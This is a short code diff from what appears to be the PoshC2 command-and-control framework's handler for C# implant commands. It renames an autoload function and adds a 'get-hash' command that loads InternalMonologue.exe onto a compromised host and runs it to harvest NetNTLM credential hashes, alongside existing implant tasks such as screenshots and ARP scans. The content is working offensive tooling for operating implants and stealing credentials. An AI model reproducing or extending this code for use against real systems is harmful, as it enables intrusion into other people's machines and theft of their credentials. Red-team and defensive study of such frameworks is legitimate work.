@@ -3,7 +3,7 @@ from Alias import cs_alias, cs_replace
 from Colours import Colours
 from Utils import randomuri, validate_sleep_time
 from DB import new_task, update_sleep, update_label, unhide_implant, kill_implant, get_implantdetails, get_pid
-from AutoLoads import check_module_loaded, run_autoloads
+from AutoLoads import check_module_loaded, run_autoloads_sharp
 from Help import sharp_help1
 from Config import ModulesDirectory, POSHDIR
 from Core import readfile_with_completion
@@ -25,7 +25,7 @@ def handle_sharp_command(command, user, randomuri, startup):
       if command.lower().strip().startswith(alias[0]):
         command = command.replace(alias[0], alias[1])   
 
-    run_autoloads(command, randomuri, user)
+    run_autoloads_sharp(command, randomuri, user)
 
     if "searchhelp" in command.lower():
         searchterm = (command.lower()).replace("searchhelp ","")
@@ -113,7 +113,11 @@ def handle_sharp_command(command, user, randomuri, startup):
 
     elif (command.lower().startswith("get-screenshot")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-        
+
+    elif (command.lower().startswith("get-hash")):
+        check_module_loaded("InternalMonologue.exe", randomuri, user)
+        new_task("run-exe InternalMonologue.Program InternalMonologue", user, randomuri)
+
     elif (command.lower().startswith("arpscan")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
   
